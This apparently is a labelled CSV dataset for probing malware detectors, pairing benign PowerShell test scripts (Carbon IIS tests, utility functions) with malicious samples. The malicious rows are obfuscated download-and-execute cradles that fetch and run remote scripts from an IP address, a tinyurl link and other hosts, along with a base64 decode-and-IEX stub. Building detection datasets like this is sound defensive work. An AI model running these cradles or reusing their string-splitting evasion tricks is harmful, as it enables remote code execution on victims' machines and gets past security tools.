filename,label,content,pair_idx,pair_role,pair_indicator,pair_strategy,source_pair_idx,seed_id,technique_id,evasion_success
3438__seed_dc2fdf741f87__downloadstring_psobject_invoke.ps1,malicious,"iex (New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke(""http://52.183.79.94:80/TYBMkTfsQ"")",42,malicious,DownloadString,evasion_probe,169,seed_dc2fdf741f87,downloadstring_psobject_invoke,False
1113.ps1,benign,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",43,benign,DownloadString,evasion_probe,171,seed_c61abb38370f,iex_call_operator_string,False
67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864__seed_c61abb38370f__iex_call_operator_string.ps1,malicious,&('I'+'EX') (New-Object Net.WebClient).DownloadString('http://cannot.loginto.me/googlehelper.ps1'),43,malicious,DownloadString,evasion_probe,171,seed_c61abb38370f,iex_call_operator_string,False
1113.ps1,benign,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",44,benign,DownloadString,evasion_probe,171,seed_c61abb38370f,iex_scriptblock_create,False
67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864__seed_c61abb38370f__iex_scriptblock_create.ps1,malicious,&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://cannot.loginto.me/googlehelper.ps1'))),44,malicious,DownloadString,evasion_probe,171,seed_c61abb38370f,iex_scriptblock_create,False
1113.ps1,benign,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",45,benign,DownloadString,evasion_probe,171,seed_c61abb38370f,downloadstring_psobject_invoke,False
67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864__seed_c61abb38370f__downloadstring_psobject_invoke.ps1,malicious,IEX (New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://cannot.loginto.me/googlehelper.ps1'),45,malicious,DownloadString,evasion_probe,171,seed_c61abb38370f,downloadstring_psobject_invoke,False
1098.ps1,benign,"$Port = 9878
$SiteName = 'TestVirtualDirectory'
$VDirName = 'VDir'
$WebConfig = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $SiteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $SiteName
}

function Start-Test
{
    Uninstall-IisWebsite -Name $SiteName
    Install-IisWebsite -Name $SiteName -Path $TestDir -Bindings ""http://*:$Port"" -AppPoolName $SiteName
    if( Test-Path $WebConfig )
    {
        Remove-Item $WebConfig
    }
}

function Stop-Test
{
    Uninstall-IisWebsite -Name $SiteName
}

function Invoke-NewVirtualDirectory($Path = $TestDir)
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path $Path
    Assert-LastProcessSucceeded 'Failed to create virtual directory.'
}

function Test-ShouldCreateVirtualDirectory
{
    $output = Invoke-NewVirtualDirectory
    Assert-Null $output
    Assert-VirtualDirectoryRunning
}

function Test-ShouldHandleExtraDirectorySeparatorCharacter
{
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath ('/{0}/' -f $VDirName) -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning
    $website = Get-IisWebsite -Name $SiteName
    Assert-Equal ('/{0}' -f $VDirName) ($website.Applications[0].VirtualDirectories[1].Path)
}

function Test-ShouldResolvePhysicalPath
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path ""$TestDir\..\..\Test\IIS""
    $physicalPath = Get-IisWebsite -SiteName $SiteName |
                        Select-Object -ExpandProperty Applications |
                        Where-Object { $_.Path -eq '/' } |
                        Select-Object -ExpandProperty VirtualDirectories |
                        Where-Object { $_.Path -eq ""/$VDirName"" } |
                        Select-Object -ExpandProperty PhysicalPath
    Assert-Equal $TestDir $physicalPath
}

function Test-ShouldUpdatePhysicalPath
{
    Invoke-NewVirtualDirectory -Path $env:SystemRoot
    Invoke-NewVirtualDirectory
    Assert-VirtualDirectoryRunning
}

function Test-ShouldCreateDoubleVitualDirectory
{
    $virtualPath = '{0}/{0}' -f $VDirName
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $virtualPath -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning $virtualPath
}

function Test-ShouldTurnOnDirectoryBrowsing
{
    Invoke-NewVirtualDirectory
    Enable-IisDirectoryBrowsing -SiteName $SiteName -Path $VDirName
    Assert-LastProcessSucceeded 'Failed to enable directory browsing.'
    Assert-FileDoesNotExist $WebConfig 'Changes not committed to apphost config level.'
    $numTries = 0
    $maxTries = 10
    $foundDirectoryListing = $false
    do
    {
        $output = Read-Url ""http://localhost:$Port/$VDirName""
        if( $output -like '*NewWebsite.html*' )
        {
            $foundDirectoryListing = $true
            break
        }
        $numTries += 1
        Start-Sleep -Milliseconds 100
    }
    while( $numTries -lt $maxTries )
    Assert-True $foundDirectoryListing ""Didn't get directory list.""
}

function Test-ShouldDeleteIfForced
{
    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-NotNull $vdir

    $defaultLogonMethod = $vdir.LogonMethod
    Assert-NotEqual 2 $defaultLogonMethod
    $vdir.LogonMethod = 2
    $app.CommitChanges()

    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot -Force
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-Equal $defaultLogonMethod $vdir.LogonMethod
}

function Assert-VirtualDirectoryRunning($vdir)
{
    $html = Read-Url ""http://localhost:$Port/$vdir/NewWebsite.html""
    Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new virtual directory.'   
}

function Read-Url($Url)
{
    $browser = New-Object Net.WebClient
    $numTries = 0
    $maxTries = 10
    do
    {
        try
        {
            return $browser.downloadString( $Url )
        }
        catch
        {
            Write-Verbose ""Error downloading '$Url': $_""
            $numTries++
            Start-Sleep -Milliseconds 100
        }
    }
    while( $numTries -lt $maxTries )
}",46,benign,DownloadString,evasion_probe,172,seed_e517072ea782,invoke_expression_call_operator_string,False
f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6__seed_e517072ea782__invoke_expression_call_operator_string.ps1,malicious,&('Invoke-'+'Expression') (New-Object Net.Webclient).Downloadstring('http://tinyurl.com/y7ukpduz'),46,malicious,DownloadString,evasion_probe,172,seed_e517072ea782,invoke_expression_call_operator_string,False
1098.ps1,benign,"$Port = 9878
$SiteName = 'TestVirtualDirectory'
$VDirName = 'VDir'
$WebConfig = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $SiteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $SiteName
}

function Start-Test
{
    Uninstall-IisWebsite -Name $SiteName
    Install-IisWebsite -Name $SiteName -Path $TestDir -Bindings ""http://*:$Port"" -AppPoolName $SiteName
    if( Test-Path $WebConfig )
    {
        Remove-Item $WebConfig
    }
}

function Stop-Test
{
    Uninstall-IisWebsite -Name $SiteName
}

function Invoke-NewVirtualDirectory($Path = $TestDir)
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path $Path
    Assert-LastProcessSucceeded 'Failed to create virtual directory.'
}

function Test-ShouldCreateVirtualDirectory
{
    $output = Invoke-NewVirtualDirectory
    Assert-Null $output
    Assert-VirtualDirectoryRunning
}

function Test-ShouldHandleExtraDirectorySeparatorCharacter
{
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath ('/{0}/' -f $VDirName) -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning
    $website = Get-IisWebsite -Name $SiteName
    Assert-Equal ('/{0}' -f $VDirName) ($website.Applications[0].VirtualDirectories[1].Path)
}

function Test-ShouldResolvePhysicalPath
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path ""$TestDir\..\..\Test\IIS""
    $physicalPath = Get-IisWebsite -SiteName $SiteName |
                        Select-Object -ExpandProperty Applications |
                        Where-Object { $_.Path -eq '/' } |
                        Select-Object -ExpandProperty VirtualDirectories |
                        Where-Object { $_.Path -eq ""/$VDirName"" } |
                        Select-Object -ExpandProperty PhysicalPath
    Assert-Equal $TestDir $physicalPath
}

function Test-ShouldUpdatePhysicalPath
{
    Invoke-NewVirtualDirectory -Path $env:SystemRoot
    Invoke-NewVirtualDirectory
    Assert-VirtualDirectoryRunning
}

function Test-ShouldCreateDoubleVitualDirectory
{
    $virtualPath = '{0}/{0}' -f $VDirName
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $virtualPath -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning $virtualPath
}

function Test-ShouldTurnOnDirectoryBrowsing
{
    Invoke-NewVirtualDirectory
    Enable-IisDirectoryBrowsing -SiteName $SiteName -Path $VDirName
    Assert-LastProcessSucceeded 'Failed to enable directory browsing.'
    Assert-FileDoesNotExist $WebConfig 'Changes not committed to apphost config level.'
    $numTries = 0
    $maxTries = 10
    $foundDirectoryListing = $false
    do
    {
        $output = Read-Url ""http://localhost:$Port/$VDirName""
        if( $output -like '*NewWebsite.html*' )
        {
            $foundDirectoryListing = $true
            break
        }
        $numTries += 1
        Start-Sleep -Milliseconds 100
    }
    while( $numTries -lt $maxTries )
    Assert-True $foundDirectoryListing ""Didn't get directory list.""
}

function Test-ShouldDeleteIfForced
{
    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-NotNull $vdir

    $defaultLogonMethod = $vdir.LogonMethod
    Assert-NotEqual 2 $defaultLogonMethod
    $vdir.LogonMethod = 2
    $app.CommitChanges()

    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot -Force
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-Equal $defaultLogonMethod $vdir.LogonMethod
}

function Assert-VirtualDirectoryRunning($vdir)
{
    $html = Read-Url ""http://localhost:$Port/$vdir/NewWebsite.html""
    Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new virtual directory.'   
}

function Read-Url($Url)
{
    $browser = New-Object Net.WebClient
    $numTries = 0
    $maxTries = 10
    do
    {
        try
        {
            return $browser.downloadString( $Url )
        }
        catch
        {
            Write-Verbose ""Error downloading '$Url': $_""
            $numTries++
            Start-Sleep -Milliseconds 100
        }
    }
    while( $numTries -lt $maxTries )
}",47,benign,DownloadString,evasion_probe,172,seed_e517072ea782,invoke_expression_scriptblock_create,False
f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6__seed_e517072ea782__invoke_expression_scriptblock_create.ps1,malicious,&([scriptblock]::Create((New-Object Net.Webclient).Downloadstring('http://tinyurl.com/y7ukpduz'))),47,malicious,DownloadString,evasion_probe,172,seed_e517072ea782,invoke_expression_scriptblock_create,False
1098.ps1,benign,"$Port = 9878
$SiteName = 'TestVirtualDirectory'
$VDirName = 'VDir'
$WebConfig = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $SiteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $SiteName
}

function Start-Test
{
    Uninstall-IisWebsite -Name $SiteName
    Install-IisWebsite -Name $SiteName -Path $TestDir -Bindings ""http://*:$Port"" -AppPoolName $SiteName
    if( Test-Path $WebConfig )
    {
        Remove-Item $WebConfig
    }
}

function Stop-Test
{
    Uninstall-IisWebsite -Name $SiteName
}

function Invoke-NewVirtualDirectory($Path = $TestDir)
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path $Path
    Assert-LastProcessSucceeded 'Failed to create virtual directory.'
}

function Test-ShouldCreateVirtualDirectory
{
    $output = Invoke-NewVirtualDirectory
    Assert-Null $output
    Assert-VirtualDirectoryRunning
}

function Test-ShouldHandleExtraDirectorySeparatorCharacter
{
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath ('/{0}/' -f $VDirName) -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning
    $website = Get-IisWebsite -Name $SiteName
    Assert-Equal ('/{0}' -f $VDirName) ($website.Applications[0].VirtualDirectories[1].Path)
}

function Test-ShouldResolvePhysicalPath
{
    Install-IisVirtualDirectory -SiteName $SiteName -Name $VDirName -Path ""$TestDir\..\..\Test\IIS""
    $physicalPath = Get-IisWebsite -SiteName $SiteName |
                        Select-Object -ExpandProperty Applications |
                        Where-Object { $_.Path -eq '/' } |
                        Select-Object -ExpandProperty VirtualDirectories |
                        Where-Object { $_.Path -eq ""/$VDirName"" } |
                        Select-Object -ExpandProperty PhysicalPath
    Assert-Equal $TestDir $physicalPath
}

function Test-ShouldUpdatePhysicalPath
{
    Invoke-NewVirtualDirectory -Path $env:SystemRoot
    Invoke-NewVirtualDirectory
    Assert-VirtualDirectoryRunning
}

function Test-ShouldCreateDoubleVitualDirectory
{
    $virtualPath = '{0}/{0}' -f $VDirName
    Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $virtualPath -PhysicalPath $PSScriptRoot
    Assert-VirtualDirectoryRunning $virtualPath
}

function Test-ShouldTurnOnDirectoryBrowsing
{
    Invoke-NewVirtualDirectory
    Enable-IisDirectoryBrowsing -SiteName $SiteName -Path $VDirName
    Assert-LastProcessSucceeded 'Failed to enable directory browsing.'
    Assert-FileDoesNotExist $WebConfig 'Changes not committed to apphost config level.'
    $numTries = 0
    $maxTries = 10
    $foundDirectoryListing = $false
    do
    {
        $output = Read-Url ""http://localhost:$Port/$VDirName""
        if( $output -like '*NewWebsite.html*' )
        {
            $foundDirectoryListing = $true
            break
        }
        $numTries += 1
        Start-Sleep -Milliseconds 100
    }
    while( $numTries -lt $maxTries )
    Assert-True $foundDirectoryListing ""Didn't get directory list.""
}

function Test-ShouldDeleteIfForced
{
    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-NotNull $vdir

    $defaultLogonMethod = $vdir.LogonMethod
    Assert-NotEqual 2 $defaultLogonMethod
    $vdir.LogonMethod = 2
    $app.CommitChanges()

    $output = Install-IisVirtualDirectory -SiteName $SiteName -VirtualPath $VDirName -PhysicalPath $PSScriptRoot -Force
    Assert-Null $output

    $app = Get-IisApplication -SiteName $SiteName 
    $vdir = $app.VirtualDirectories[('/{0}' -f $VDirName)]
    Assert-Equal $defaultLogonMethod $vdir.LogonMethod
}

function Assert-VirtualDirectoryRunning($vdir)
{
    $html = Read-Url ""http://localhost:$Port/$vdir/NewWebsite.html""
    Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new virtual directory.'   
}

function Read-Url($Url)
{
    $browser = New-Object Net.WebClient
    $numTries = 0
    $maxTries = 10
    do
    {
        try
        {
            return $browser.downloadString( $Url )
        }
        catch
        {
            Write-Verbose ""Error downloading '$Url': $_""
            $numTries++
            Start-Sleep -Milliseconds 100
        }
    }
    while( $numTries -lt $maxTries )
}",48,benign,DownloadString,evasion_probe,172,seed_e517072ea782,downloadstring_psobject_invoke,False
f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6__seed_e517072ea782__downloadstring_psobject_invoke.ps1,malicious,Invoke-Expression (New-Object Net.Webclient).PSObject.Methods['Download'+'String'].Invoke('http://tinyurl.com/y7ukpduz'),48,malicious,DownloadString,evasion_probe,172,seed_e517072ea782,downloadstring_psobject_invoke,False
1238.ps1,benign,"[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]
    $Name
)

Set-StrictMode -Version 'Latest'

$Name = [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($Name) ) 
[Environment]::SetEnvironmentVariable( $Name, $null, [EnvironmentVariableTarget]::User )",49,benign,FromBase64String,evasion_probe,227,seed_0de74614c959,iex_call_operator_string,False
231032778ec6e8baa7807ce3aeae9924bd62a36516d2655219d9334e0339c874__seed_0de74614c959__iex_call_operator_string.ps1,malicious,"$qwertyuioop = @'

'@


$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))

&('I'+'EX') $Decryption",49,malicious,FromBase64String,evasion_probe,227,seed_0de74614c959,iex_call_operator_string,False
1238.ps1,benign,"[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]
    $Name
)

Set-StrictMode -Version 'Latest'

$Name = [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($Name) ) 
[Environment]::SetEnvironmentVariable( $Name, $null, [EnvironmentVariableTarget]::User )",50,benign,FromBase64String,evasion_probe,227,seed_0de74614c959,iex_scriptblock_create,False
231032778ec6e8baa7807ce3aeae9924bd62a36516d2655219d9334e0339c874__seed_0de74614c959__iex_scriptblock_create.ps1,malicious,"$qwertyuioop = @'

'@


$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))

&([scriptblock]::Create($Decryption))",50,malicious,FromBase64String,evasion_probe,227,seed_0de74614c959,iex_scriptblock_create,False
1637.ps1,benign,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",51,benign,IEX,evasion_probe,271,seed_a4fecca9d2bf,iex_call_operator_string,False
f55369c6d50c5a57c0a54c0d1a1560c0601e17f08d64f94a0fea9eed9768beae__seed_a4fecca9d2bf__iex_call_operator_string.ps1,malicious,irm massgrave.dev/get | &('I'+'EX'),51,malicious,IEX,evasion_probe,271,seed_a4fecca9d2bf,iex_call_operator_string,False
1634.ps1,benign,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",52,benign,IEX,evasion_probe,272,seed_5f819bb0b3c0,iex_call_operator_string,False
93a790e0a65d0a47a7988e81f069c4c7044802c50848735dcaf0f6b0ef921dcd__seed_5f819bb0b3c0__iex_call_operator_string.ps1,malicious,irm https://massgrave.dev/get | &('I'+'EX'),52,malicious,IEX,evasion_probe,272,seed_5f819bb0b3c0,iex_call_operator_string,False
